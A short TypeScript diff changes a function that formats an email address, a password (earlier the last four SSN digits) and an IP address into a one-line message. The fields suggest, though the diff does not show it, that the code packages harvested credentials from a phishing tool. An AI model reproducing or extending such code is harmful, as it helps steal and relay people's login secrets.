@@ -5,9 +5,9 @@ export const generateOutputMessage = (
   url: string,
   ip: string,
 ): string => {
-  const { email, last4ssn: ssn } = crendential;
+  const { email, password } = crendential;
 
-  const message = `EMAIL=${email} SSN=${ssn} URL=${url} IP=${ip}`;
+  const message = `EMAIL=${email} PASSWORD=${password} IP=${ip}`;
 
   return message;
 };
